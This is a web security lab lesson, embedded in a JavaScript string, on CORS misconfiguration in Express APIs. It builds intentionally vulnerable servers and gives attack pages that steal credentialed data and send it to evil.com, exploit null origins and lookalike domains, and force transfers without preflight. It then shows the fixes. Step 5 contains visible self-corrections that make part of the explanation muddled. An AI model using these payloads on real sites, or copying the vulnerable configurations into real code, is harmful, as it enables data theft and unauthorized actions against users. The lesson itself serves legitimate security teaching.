window.LESSONS = window.LESSONS || {};
window.LESSONS.cors = `

<h1 class="lesson-title">Lab 13: CORS Misconfiguration</h1>

<p class="lesson-subtitle">
  You are going to learn how Cross-Origin Resource Sharing misconfigurations turn your API into an
  open buffet for attackers. CORS is not a security feature. It is a controlled relaxation of a
  security feature, and that distinction matters more than most developers realize. I have seen
  production APIs that effectively said "yes, any website on the internet can read authenticated
  responses from our endpoints" and the developers had no idea, because the cors npm package made
  it feel like they were doing the right thing.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 1</span> What CORS Actually Does</h2>

<p>
  Before we talk about CORS, you need to understand what it is relaxing: the Same-Origin Policy.
  The SOP is one of the most important security boundaries in the browser. It says that JavaScript
  running on one origin (a combination of scheme, host, and port) cannot read responses from a
  different origin. That is it. It does not prevent requests from being sent -- that is a critical
  distinction we will come back to -- but it prevents the response from being readable by the
  requesting script.
</p>

<p>
  An origin is defined by three components: the protocol (http vs https), the domain
  (example.com), and the port (443, 8080, etc). If any one of these differs between the page
  making the request and the server receiving it, the browser considers them different origins.
  So <code>https://app.example.com</code> and <code>https://api.example.com</code> are different
  origins. So are <code>http://localhost:3000</code> and <code>http://localhost:8080</code>. And
  <code>http://example.com</code> and <code>https://example.com</code> are different origins too,
  because the scheme differs.
</p>

<p>
  CORS is the mechanism that lets a server say "I am okay with these specific other origins reading
  my responses." It works through HTTP headers. When a browser makes a cross-origin request, it
  looks at the response headers to decide whether the calling JavaScript is allowed to read the
  response. The key headers are:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">CORS Response Headers</span>
    <span class="code-copy">Copy</span>
  </div>
  <pre>
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
  </pre>
</div>

<p>
  There are two types of CORS requests: <strong>simple requests</strong> and <strong>preflighted
  requests</strong>. This distinction is critical for understanding one of the attacks later in
  this lab.
</p>

<p>
  A <strong>simple request</strong> meets all of these conditions: the method is GET, HEAD, or POST;
  the only headers set manually are Accept, Accept-Language, Content-Language, or Content-Type; and
  the Content-Type is one of <code>application/x-www-form-urlencoded</code>,
  <code>multipart/form-data</code>, or <code>text/plain</code>. For simple requests, the browser
  sends the request immediately and checks the CORS headers on the response. The server processes
  the request either way -- the browser just decides whether to let JavaScript see the response.
</p>

<p>
  A <strong>preflighted request</strong> is anything that does not qualify as simple. If you send a
  POST with <code>Content-Type: application/json</code>, the browser first sends an OPTIONS request
  (the "preflight") to ask the server whether the actual request is allowed. Only if the server
  responds with appropriate CORS headers does the browser send the real request. This is an important
  safety mechanism, but as we will see, attackers can deliberately craft simple requests to bypass it.
</p>

<div class="callout warn">
  <div class="callout-title">CORS Does Not Prevent Requests</div>
  <div class="callout-text">
    This is the single most misunderstood aspect of CORS. The Same-Origin Policy and CORS control
    whether JavaScript can <strong>read the response</strong>. They do NOT prevent the request from
    being sent. For simple requests, the server receives and processes the request regardless of the
    Origin header. The browser only blocks the JavaScript from accessing the response data. This is
    why CORS is not a replacement for CSRF protection.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 2</span> Build the Vulnerable API</h2>

<p>
  Let us build an Express API that serves authenticated user data. This is the kind of endpoint you
  find in every single-page application -- a frontend on one domain calls an API on another domain
  to fetch the logged-in user's profile, account settings, or dashboard data. We will use the
  <code>cors</code> npm package, which is the most popular CORS middleware for Express with over
  20 million weekly downloads. And we will configure it in a way that I have seen in dozens of
  real production applications.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js</span>
    <span class="code-copy">Copy</span>
  </div>
  <pre>
<span class="kw">const</span> express <span class="op">=</span> <span class="fn">require</span>(<span class="str">'express'</span>);
<span class="kw">const</span> cors <span class="op">=</span> <span class="fn">require</span>(<span class="str">'cors'</span>);
<span class="kw">const</span> session <span class="op">=</span> <span class="fn">require</span>(<span class="str">'express-session'</span>);

<span class="kw">const</span> app <span class="op">=</span> <span class="fn">express</span>();

<span class="cmt">// Session setup</span>
app.<span class="fn">use</span>(<span class="fn">session</span>({
  secret: <span class="str">'keyboard-cat'</span>,
  resave: <span class="kw">false</span>,
  saveUninitialized: <span class="kw">false</span>,
  cookie: { secure: <span class="kw">false</span>, httpOnly: <span class="kw">true</span> }
}));

<span class="cmt">// VULNERABLE: reflects any origin and allows credentials</span>
app.<span class="fn">use</span>(<span class="fn">cors</span>({
  origin: <span class="kw">true</span>,          <span class="cmt">// reflects the request Origin header back</span>
  credentials: <span class="kw">true</span>      <span class="cmt">// allows cookies to be sent cross-origin</span>
}));

app.<span class="fn">use</span>(express.<span class="fn">json</span>());

<span class="cmt">// Simulated login</span>
app.<span class="fn">post</span>(<span class="str">'/api/login'</span>, (req, res) <span class="op">=></span> {
  req.session.user <span class="op">=</span> {
    id: <span class="num">1</span>,
    name: <span class="str">'Alice Johnson'</span>,
    email: <span class="str">'alice@company.com'</span>,
    role: <span class="str">'admin'</span>,
    ssn: <span class="str">'123-45-6789'</span>
  };
  res.<span class="fn">json</span>({ success: <span class="kw">true</span> });
});

<span class="cmt">// Protected endpoint returning sensitive data</span>
app.<span class="fn">get</span>(<span class="str">'/api/me'</span>, (req, res) <span class="op">=></span> {
  <span class="kw">if</span> (!req.session?.user) {
    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ error: <span class="str">'Not authenticated'</span> });
  }
  res.<span class="fn">json</span>({ user: req.session.user });
});

<span class="cmt">// Protected endpoint for account actions</span>
app.<span class="fn">post</span>(<span class="str">'/api/transfer'</span>, (req, res) <span class="op">=></span> {
  <span class="kw">if</span> (!req.session?.user) {
    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ error: <span class="str">'Not authenticated'</span> });
  }
  <span class="kw">const</span> { to, amount } <span class="op">=</span> req.body;
  res.<span class="fn">json</span>({ success: <span class="kw">true</span>, message: \`Transferred \${amount} to \${to}\` });
});

app.<span class="fn">listen</span>(<span class="num">3000</span>, () <span class="op">=></span> console.<span class="fn">log</span>(<span class="str">'API running on :3000'</span>));
  </pre>
</div>

<p>
  Look at the CORS configuration: <code>origin: true</code>. In the cors package, setting
  <code>origin: true</code> tells the middleware to reflect the incoming <code>Origin</code> header
  directly into the <code>Access-Control-Allow-Origin</code> response header. Whatever origin the
  request claims to come from, the server says "yes, that origin is allowed." Combined with
  <code>credentials: true</code>, this means any website on the internet can make authenticated
  requests to our API and read the responses.
</p>

<p>
  This is the CORS equivalent of leaving your front door wide open and putting a sign that says
  "everything inside is free." Let me show you exactly how an attacker exploits this.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 3</span> Scenario 1 &mdash; Origin Reflection Without Validation</h2>

<p>
  This is the most common and most dangerous CORS misconfiguration. The server blindly reflects
  the Origin header from the request into the <code>Access-Control-Allow-Origin</code> response
  header. It trusts any origin. Here is what happens at the HTTP level when a request comes in
  from an attacker's site:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">HTTP Request from evil.com</span>
    <span class="code-copy">Copy</span>
  </div>
  <pre>
GET /api/me HTTP/1.1
Host: vulnerable-api.com
Origin: https://evil.com
Cookie: connect.sid=s%3Aabc123...
  </pre>
</div>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">HTTP Response (vulnerable)</span>
    <span class="code-copy">Copy</span>
  </div>
  <pre>
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"user":{"id":1,"name":"Alice Johnson","email":"alice@company.com","role":"admin","ssn":"123-45-6789"}}
  </pre>
</div>

<p>
  The server reflected <code>https://evil.com</code> right back in the Allow-Origin header. The
  browser sees this and says "the server explicitly allowed this origin, so I will let the
  JavaScript read the response." And with <code>Access-Control-Allow-Credentials: true</code>,
  the browser sent Alice's session cookie along with the request. The attacker now has Alice's
  full profile, including her SSN.
</p>

<p>
  Here is the complete attack page. An attacker hosts this on their domain and tricks the victim
  into visiting it -- via phishing, a link in a forum post, an ad redirect, anything that gets
  the victim's browser to load the page:
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Origin Reflection Data Theft</div>
  <pre>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Free Gift Card Giveaway&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
  &lt;h1&gt;Congratulations! Claim your prize!&lt;/h1&gt;

  &lt;script&gt;
    // Attacker's page at https://evil.com/steal.html
    // The victim is logged into vulnerable-api.com

    fetch('https://vulnerable-api.com/api/me', {
      credentials: 'include'   // sends cookies cross-origin
    })
    .then(response =&gt; response.json())
    .then(data =&gt; {
      // Exfiltrate the stolen data to attacker's server
      fetch('https://evil.com/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          stolen: data,
          victim_cookies: document.cookie
        })
      });
    });
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
  </pre>
</div>

<p>
  That is the entire attack. Twelve lines of JavaScript. The victim visits the page, their browser
  automatically sends their session cookie to the vulnerable API, the API responds with their
  private data, and the attacker's script reads it and sends it to their collection server. The
  victim sees a fake giveaway page and has no idea their data was just stolen.
</p>

<div class="callout info">
  <div class="callout-title">Why credentials: 'include' Matters</div>
  <div class="callout-text">
    By default, <code>fetch()</code> does not send cookies on cross-origin requests. The attacker
    must explicitly set <code>credentials: 'include'</code>. But this only works if the server
    responds with <code>Access-Control-Allow-Credentials: true</code> AND a specific origin (not
    the wildcard <code>*</code>). This is why <code>origin: true</code> in the cors package is so
    dangerous -- it gives the attacker exactly the specific origin header they need to make
    credentialed requests work.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 4</span> Scenario 2 &mdash; Null Origin Abuse</h2>

<p>
  Some developers hear about the origin reflection problem and think "I will just allow
  <code>null</code> as a special case for local development." Or they configure a list of allowed
  origins that includes <code>null</code>. This is more common than you think, and it is
  exploitable.
</p>

<p>
  Here is a server configuration that allows the null origin:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js (null origin allowed)</span>
    <span class="code-copy">Copy</span>
  </div>
  <pre>
app.<span class="fn">use</span>(<span class="fn">cors</span>({
  origin: (origin, callback) <span class="op">=></span> {
    <span class="kw">const</span> allowed <span class="op">=</span> [
      <span class="str">'https://app.example.com'</span>,
      <span class="str">'null'</span>   <span class="cmt">// "for local development"</span>
    ];
    <span class="kw">if</span> (!origin || allowed.<span class="fn">includes</span>(origin)) {
      <span class="fn">callback</span>(<span class="kw">null</span>, <span class="kw">true</span>);
    } <span class="kw">else</span> {
      <span class="fn">callback</span>(<span class="kw">new</span> Error(<span class="str">'Not allowed by CORS'</span>));
    }
  },
  credentials: <span class="kw">true</span>
}));
  </pre>
</div>

<p>
  The check <code>!origin</code> is there because some requests (like same-origin requests from
  the server itself) do not include an Origin header. But notice the list also includes the string
  <code>'null'</code>. The developer thought this would only apply during local testing. Here is
  the problem: an attacker can force a browser to send <code>Origin: null</code> by using a
  sandboxed iframe.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Null Origin via Sandboxed Iframe</div>
  <pre>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Interesting Article&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
  &lt;h1&gt;Loading content...&lt;/h1&gt;

  &lt;!-- The sandbox attribute without allow-same-origin
       causes the iframe to send Origin: null --&gt;
  &lt;iframe sandbox="allow-scripts" srcdoc="
    &lt;script&gt;
      fetch('https://vulnerable-api.com/api/me', {
        credentials: 'include'
      })
      .then(r =&gt; r.json())
      .then(data =&gt; {
        // Send stolen data to parent window
        parent.postMessage(JSON.stringify(data), '*');
      });
    &lt;/script&gt;
  "&gt;&lt;/iframe&gt;

  &lt;script&gt;
    window.addEventListener('message', function(e) {
      // Exfiltrate to attacker's server
      fetch('https://evil.com/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: e.data
      });
    });
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
  </pre>
</div>

<p>
  When a browser renders an iframe with <code>sandbox="allow-scripts"</code> (but without
  <code>allow-same-origin</code>), it assigns the iframe a unique opaque origin. The HTTP
  request from inside that iframe sends <code>Origin: null</code>. The server sees
  <code>null</code>, checks it against the allowlist, finds a match, and responds with
  <code>Access-Control-Allow-Origin: null</code> and
  <code>Access-Control-Allow-Credentials: true</code>. The browser allows the JavaScript inside
  the iframe to read the response.
</p>

<p>
  There are other situations that produce a null origin too: requests from local files using the
  <code>file://</code> protocol, redirects across origins in certain browsers, and requests from
  data URIs. The null origin is not a trustworthy signal for anything.
</p>

<div class="callout warn">
  <div class="callout-title">Never Allow the Null Origin</div>
  <div class="callout-text">
    There is no legitimate production reason to allow <code>Origin: null</code>. If you need CORS
    relaxation for local development, allow <code>http://localhost:3000</code> (or whatever port
    you use) and strip it from the allowlist before deploying to production. Better yet, use
    environment-based configuration so development origins are never present in production config.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 5</span> Scenario 3 &mdash; Subdomain Wildcard Bypass</h2>

<p>
  At this point, a developer might think "fine, I will validate the origin properly. I will check
  that the request comes from one of my subdomains." And they write a validation function that
  checks whether the origin ends with their domain. This feels correct. It is not.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js (flawed subdomain check)</span>
    <span class="code-copy">Copy</span>
  </div>
  <pre>
app.<span class="fn">use</span>(<span class="fn">cors</span>({
  origin: (origin, callback) <span class="op">=></span> {
    <span class="cmt">// VULNERABLE: endsWith is not sufficient</span>
    <span class="kw">if</span> (origin <span class="op">&&</span> origin.<span class="fn">endsWith</span>(<span class="str">'.example.com'</span>)) {
      <span class="fn">callback</span>(<span class="kw">null</span>, <span class="kw">true</span>);
    } <span class="kw">else</span> {
      <span class="fn">callback</span>(<span class="kw">new</span> Error(<span class="str">'Not allowed by CORS'</span>));
    }
  },
  credentials: <span class="kw">true</span>
}));
  </pre>
</div>

<p>
  The problem: <code>endsWith('.example.com')</code> matches more than just subdomains of
  example.com. An attacker can register a domain like <code>evil-example.com</code>, and
  <code>'https://evil-example.com'.endsWith('.example.com')</code> is... wait, actually that
  returns false. Let me be more precise about the real attack vector. The attacker registers
  <code>notexample.com</code>? No. Here is the actual technique:
</p>

<p>
  The attacker registers <code>attackerexample.com</code>. Now
  <code>'https://attackerexample.com'.endsWith('example.com')</code> returns <code>true</code>.
  But we are checking for <code>.example.com</code> with the leading dot. So the attacker
  instead sets up <code>attacker.example.com</code>? No, they do not control that subdomain.
  Here is the real attack: the attacker registers a domain like
  <code>evilexample.com</code> and creates a subdomain <code>anything.evilexample.com</code>
  -- wait. Let me show you the correct vulnerability.
</p>

<p>
  Here is the actually exploitable version of this pattern, which is extremely common in the wild:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js (exploitable origin check)</span>
    <span class="code-copy">Copy</span>
  </div>
  <pre>
app.<span class="fn">use</span>(<span class="fn">cors</span>({
  origin: (origin, callback) <span class="op">=></span> {
    <span class="cmt">// VULNERABLE: does not anchor the check to the domain boundary</span>
    <span class="kw">if</span> (origin <span class="op">&&</span> origin.<span class="fn">endsWith</span>(<span class="str">'example.com'</span>)) {
      <span class="fn">callback</span>(<span class="kw">null</span>, <span class="kw">true</span>);
    } <span class="kw">else</span> {
      <span class="fn">callback</span>(<span class="kw">new</span> Error(<span class="str">'Not allowed by CORS'</span>));
    }
  },
  credentials: <span class="kw">true</span>
}));
  </pre>
</div>

<p>
  Notice: <code>endsWith('example.com')</code> without the leading dot. Now the attacker
  registers <code>evilexample.com</code>. The check
  <code>'https://evilexample.com'.endsWith('example.com')</code> returns <code>true</code>.
  The attacker's origin passes validation.
</p>

<p>
  Even the version with the leading dot (<code>.example.com</code>) has problems. If an attacker
  finds an XSS vulnerability on any subdomain of example.com -- say, a forgotten staging
  environment at <code>staging.example.com</code> or a marketing microsite at
  <code>promo.example.com</code> -- they can use that compromised subdomain as a trusted origin
  to attack your API. Trusting all subdomains means your security is only as strong as the
  weakest subdomain.
</p>

<p>
  Here is another common flawed pattern using <code>includes()</code>:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js (includes check — also vulnerable)</span>
    <span class="code-copy">Copy</span>
  </div>
  <pre>
<span class="cmt">// VULNERABLE: includes() is even worse than endsWith()</span>
<span class="kw">if</span> (origin.<span class="fn">includes</span>(<span class="str">'example.com'</span>)) {
  <span class="fn">callback</span>(<span class="kw">null</span>, <span class="kw">true</span>);
}

<span class="cmt">// Attacker origin: https://example.com.evil.com  -- passes!</span>
<span class="cmt">// Attacker origin: https://evil.com/?ref=example.com  -- passes!</span>
  </pre>
</div>

<div class="attack-box">
  <div class="attack-title">Attack: Subdomain Bypass via Lookalike Domain</div>
  <pre>
&lt;!-- Hosted at https://evilexample.com/steal.html --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
  &lt;script&gt;
    // Server checks: origin.endsWith('example.com')
    // Our origin "https://evilexample.com" passes the check

    fetch('https://api.example.com/api/me', {
      credentials: 'include'
    })
    .then(r =&gt; r.json())
    .then(data =&gt; {
      // Got the authenticated user's data
      navigator.sendBeacon(
        'https://evilexample.com/exfil',
        JSON.stringify(data)
      );
    });
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
  </pre>
</div>

<p>
  The attacker registers a cheap domain, hosts a page, and gets the same access as your
  legitimate subdomains. Domain registration costs about ten dollars. That is the price of
  bypassing a flawed CORS policy.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 6</span> Scenario 4 &mdash; Preflight Bypass with Simple Requests</h2>

<p>
  This attack exploits the distinction between simple and preflighted requests that we discussed
  in Step 1. Many developers assume that CORS preflight will catch malicious requests, but
  preflight only triggers for non-simple requests. An attacker who understands the rules can
  craft a request that qualifies as "simple" and bypasses preflight entirely.
</p>

<p>
  Recall the conditions for a simple request: the method must be GET, HEAD, or POST, and the
  Content-Type must be one of <code>application/x-www-form-urlencoded</code>,
  <code>multipart/form-data</code>, or <code>text/plain</code>. If a request meets these
  conditions, no OPTIONS preflight is sent. The actual request goes directly to the server.
</p>

<p>
  Now consider an API that expects JSON data:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">routes/transfer.js</span>
    <span class="code-copy">Copy</span>
  </div>
  <pre>
app.<span class="fn">post</span>(<span class="str">'/api/transfer'</span>, (req, res) <span class="op">=></span> {
  <span class="kw">if</span> (!req.session?.user) {
    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ error: <span class="str">'Not authenticated'</span> });
  }

  <span class="cmt">// Developer assumes this always receives JSON</span>
  <span class="kw">const</span> { to, amount } <span class="op">=</span> req.body;
  <span class="fn">processTransfer</span>(req.session.user.id, to, amount);
  res.<span class="fn">json</span>({ success: <span class="kw">true</span> });
});
  </pre>
</div>

<p>
  If the CORS policy is restrictive and the attacker sends
  <code>Content-Type: application/json</code>, the browser will issue a preflight OPTIONS request
  first. If the preflight is denied, the actual POST never happens. The developer feels safe.
</p>

<p>
  But the attacker can send the request as <code>Content-Type: text/plain</code>, which qualifies
  as a simple request. No preflight. The browser sends the POST directly:
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Preflight Bypass with text/plain</div>
  <pre>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
  &lt;script&gt;
    // No preflight! text/plain is a "simple" content type.
    // The browser sends this POST directly to the server.
    fetch('https://vulnerable-api.com/api/transfer', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'text/plain'
      },
      body: JSON.stringify({ to: 'attacker-account', amount: 10000 })
    });

    // Note: the attacker cannot READ the response (CORS blocks that),
    // but the server still PROCESSES the request.
    // The transfer happens. The money moves. Game over.
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
  </pre>
</div>

<p>
  If the server uses <code>express.json()</code> middleware, this particular attack might not
  parse correctly because the Content-Type is not <code>application/json</code>. But many
  applications use body-parser configurations that are more lenient, or they use custom parsing
  that reads the raw body. And even if Express does not parse it, some frameworks and custom
  middleware will attempt to parse the body regardless of Content-Type.
</p>

<p>
  Here is a more reliable version using a plain HTML form, which is even simpler and does not
  even need JavaScript:
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Preflight Bypass with Hidden Form</div>
  <pre>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
  &lt;!-- Auto-submitting form. No preflight, no JavaScript needed. --&gt;
  &lt;form id="steal" method="POST"
    action="https://vulnerable-api.com/api/transfer"
    enctype="text/plain"&gt;
    &lt;input type="hidden"
      name='{"to":"attacker-account","amount":10000,"ignore":"'
      value='"}' /&gt;
  &lt;/form&gt;

  &lt;script&gt;document.getElementById('steal').submit();&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
  </pre>
</div>

<p>
  The form enctype of <code>text/plain</code> causes the browser to send the body as
  <code>name=value</code> with no URL encoding. By carefully crafting the name and value of the
  hidden input, the attacker constructs a body that looks like valid JSON:
  <code>{"to":"attacker-account","amount":10000,"ignore":"="}</code>. Some servers will parse
  this as JSON. The extra <code>"ignore":"="</code> at the end is just junk that the server
  ignores.
</p>

<div class="callout warn">
  <div class="callout-title">Preflight Is Not a Security Boundary</div>
  <div class="callout-text">
    Never rely on CORS preflight to protect state-changing endpoints. Preflight can be bypassed
    with simple requests. If your endpoint changes state (transfers money, updates data, deletes
    records), it needs CSRF tokens or other server-side protections regardless of your CORS
    configuration.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 7</span> Fix &mdash; Proper CORS Configuration</h2>

<p>
  Now that you have seen four different ways CORS can be exploited, let me show you how to
  configure it correctly. The core principle is simple: never reflect the Origin header. Always
  validate against an explicit allowlist using exact string matching.
</p>

<div class="fix-box">
  <div class="fix-title">Fix: Explicit Origin Allowlist</div>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">config/cors.js</span>
    <span class="code-copy">Copy</span>
  </div>
  <pre>
<span class="kw">const</span> cors <span class="op">=</span> <span class="fn">require</span>(<span class="str">'cors'</span>);

<span class="cmt">// Explicit allowlist of trusted origins</span>
<span class="kw">const</span> ALLOWED_ORIGINS <span class="op">=</span> <span class="kw">new</span> Set([
  <span class="str">'https://app.example.com'</span>,
  <span class="str">'https://admin.example.com'</span>,
  <span class="str">'https://dashboard.example.com'</span>
]);

<span class="cmt">// In development, add local origins from env</span>
<span class="kw">if</span> (process.env.NODE_ENV <span class="op">===</span> <span class="str">'development'</span>) {
  ALLOWED_ORIGINS.<span class="fn">add</span>(<span class="str">'http://localhost:3000'</span>);
  ALLOWED_ORIGINS.<span class="fn">add</span>(<span class="str">'http://localhost:5173'</span>);
}

<span class="kw">const</span> corsOptions <span class="op">=</span> {
  origin: (origin, callback) <span class="op">=></span> {
    <span class="cmt">// Allow requests with no origin (same-origin, curl, etc)</span>
    <span class="kw">if</span> (!origin) {
      <span class="kw">return</span> <span class="fn">callback</span>(<span class="kw">null</span>, <span class="kw">true</span>);
    }

    <span class="cmt">// Exact match only. No endsWith, no includes, no regex.</span>
    <span class="kw">if</span> (ALLOWED_ORIGINS.<span class="fn">has</span>(origin)) {
      <span class="fn">callback</span>(<span class="kw">null</span>, <span class="kw">true</span>);
    } <span class="kw">else</span> {
      console.<span class="fn">warn</span>(\`CORS blocked origin: \${origin}\`);
      <span class="fn">callback</span>(<span class="kw">new</span> Error(<span class="str">'Not allowed by CORS'</span>));
    }
  },

  credentials: <span class="kw">true</span>,

  <span class="cmt">// Only allow methods your API actually uses</span>
  methods: [<span class="str">'GET'</span>, <span class="str">'POST'</span>, <span class="str">'PUT'</span>, <span class="str">'DELETE'</span>],

  <span class="cmt">// Only allow headers your API actually needs</span>
  allowedHeaders: [<span class="str">'Content-Type'</span>, <span class="str">'Authorization'</span>, <span class="str">'X-CSRF-Token'</span>],

  <span class="cmt">// Cache preflight responses for 1 hour</span>
  maxAge: <span class="num">3600</span>,

  <span class="cmt">// Do not expose unnecessary headers to the browser</span>
  exposedHeaders: [<span class="str">'X-Request-Id'</span>]
};

module.exports <span class="op">=</span> <span class="fn">cors</span>(corsOptions);
  </pre>
</div>
</div>

<p>
  Let me walk through every design decision in this configuration:
</p>

<p>
  <strong>Use a Set for the allowlist.</strong> Set lookups are O(1) instead of O(n) for array
  includes. This does not matter when you have three origins, but it is good practice and it
  communicates intent: this is a collection of unique, exact values that we check membership
  against.
</p>

<p>
  <strong>Exact match with <code>.has()</code>.</strong> No <code>endsWith()</code>. No
  <code>includes()</code>. No regex. Exact string matching eliminates every subdomain bypass and
  lookalike domain attack. If an origin is not literally in the set, it is rejected.
</p>

<p>
  <strong>Environment-based development origins.</strong> Local development origins like
  <code>http://localhost:3000</code> are only added when <code>NODE_ENV</code> is
  <code>development</code>. They never exist in the production allowlist. This is far better
  than leaving development origins in a hardcoded list and hoping someone remembers to remove
  them before deploying.
</p>

<p>
  <strong>Log rejected origins.</strong> The <code>console.warn</code> on rejection gives you
  visibility into who is making cross-origin requests that your policy does not allow. This is
  invaluable for detecting attacks and also for identifying legitimate origins you forgot to
  add to the allowlist.
</p>

<p>
  <strong>Restrict methods and headers.</strong> Do not allow methods your API does not use.
  If you never use PATCH, do not allow it. Restricting <code>allowedHeaders</code> limits what
  custom headers can be sent in preflighted requests.
</p>

<p>
  If you genuinely need a public API that any origin can call (like a public data API with no
  authentication), use the wildcard correctly:
</p>

<div class="fix-box">
  <div class="fix-title">Fix: Public API with Wildcard (No Credentials)</div>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">config/public-cors.js</span>
    <span class="code-copy">Copy</span>
  </div>
  <pre>
<span class="cmt">// For truly public APIs with NO authentication</span>
<span class="kw">const</span> publicCorsOptions <span class="op">=</span> {
  origin: <span class="str">'*'</span>,           <span class="cmt">// any origin can read responses</span>
  credentials: <span class="kw">false</span>,    <span class="cmt">// NEVER combine * with credentials</span>
  methods: [<span class="str">'GET'</span>],       <span class="cmt">// read-only access</span>
  maxAge: <span class="num">86400</span>
};
  </pre>
</div>
</div>

<p>
  The browser enforces a critical rule: you cannot combine
  <code>Access-Control-Allow-Origin: *</code> with
  <code>Access-Control-Allow-Credentials: true</code>. If you try, the browser rejects the
  response. This is why the <code>origin: true</code> pattern exists in the cors package -- it
  is a workaround to support credentials by reflecting the origin instead of using the wildcard.
  And that workaround is exactly what creates the vulnerability.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 8</span> Deeper: CORS vs CSRF</h2>

<p>
  This is the part of the lab where I see the most confusion, even among experienced developers.
  Let me be absolutely clear about the relationship between CORS and CSRF, because getting this
  wrong can leave your application vulnerable even when you think you have locked everything down.
</p>

<p>
  <strong>CORS prevents the attacker from reading the response.</strong> When your CORS policy
  correctly rejects a cross-origin request, the attacker's JavaScript cannot see what your server
  sent back. The browser enforces this. The response data stays invisible to the malicious script.
</p>

<p>
  <strong>CORS does NOT prevent the request from being sent.</strong> For simple requests (GET,
  POST with form-compatible Content-Types), the browser sends the request to your server
  regardless of your CORS policy. Your server receives it, processes it, and sends a response.
  The CORS check only determines whether the browser lets the JavaScript read that response.
  By the time the browser blocks the response, the damage is already done if the request had
  side effects.
</p>

<p>
  Here is a concrete scenario. You have an endpoint <code>POST /api/delete-account</code>. You
  have strict CORS that only allows <code>https://app.example.com</code>. An attacker creates a
  page with a form that submits to your endpoint. The victim visits the page. The form submits.
  Your server receives the request with the victim's session cookie. The account gets deleted.
  CORS blocks the attacker from reading the response, but the attacker does not care about the
  response -- the account is already gone.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">CORS vs CSRF Comparison</span>
    <span class="code-copy">Copy</span>
  </div>
  <pre>
<span class="cmt">// What CORS prevents (reading data):</span>
<span class="cmt">// Attacker's page tries to read victim's profile</span>
fetch(<span class="str">'https://api.example.com/api/me'</span>, { credentials: <span class="str">'include'</span> })
  .then(r <span class="op">=></span> r.json())
  .then(data <span class="op">=></span> {
    <span class="cmt">// BLOCKED by CORS if origin not allowed.</span>
    <span class="cmt">// Attacker cannot see 'data'.</span>
  });

<span class="cmt">// What CORS does NOT prevent (sending actions):</span>
<span class="cmt">// Simple POST goes through even if CORS would block the response</span>
fetch(<span class="str">'https://api.example.com/api/delete-account'</span>, {
  method: <span class="str">'POST'</span>,
  credentials: <span class="str">'include'</span>,
  headers: { <span class="str">'Content-Type'</span>: <span class="str">'text/plain'</span> },
  body: <span class="str">'confirm=true'</span>
});
<span class="cmt">// Server PROCESSES this request. Account deleted.</span>
<span class="cmt">// CORS only blocks the attacker from reading the response.</span>
  </pre>
</div>

<p>
  This is why you need BOTH:
</p>

<p>
  <strong>Strict CORS</strong> to prevent attackers from reading sensitive data cross-origin.
  This protects against data theft: an attacker cannot silently read your user's profile, API
  keys, or financial information.
</p>

<p>
  <strong>CSRF tokens</strong> (or SameSite cookies) to prevent attackers from triggering
  state-changing actions on behalf of the user. This protects against unauthorized actions:
  an attacker cannot delete accounts, transfer money, or change settings.
</p>

<div class="callout info">
  <div class="callout-title">The SameSite Cookie Defense</div>
  <div class="callout-text">
    Modern browsers support the <code>SameSite</code> cookie attribute.
    <code>SameSite=Lax</code> (the default in modern browsers) prevents cookies from being sent
    on cross-origin POST requests, which mitigates most CSRF attacks. <code>SameSite=Strict</code>
    prevents cookies from being sent on any cross-origin request. However, relying solely on
    SameSite requires that all your users are on modern browsers, and it does not protect against
    subdomain attacks. A defense-in-depth approach combines SameSite cookies with CSRF tokens.
  </div>
</div>

<hr>

<h2>Lab 13 Checklist</h2>

<ul class="task-list">
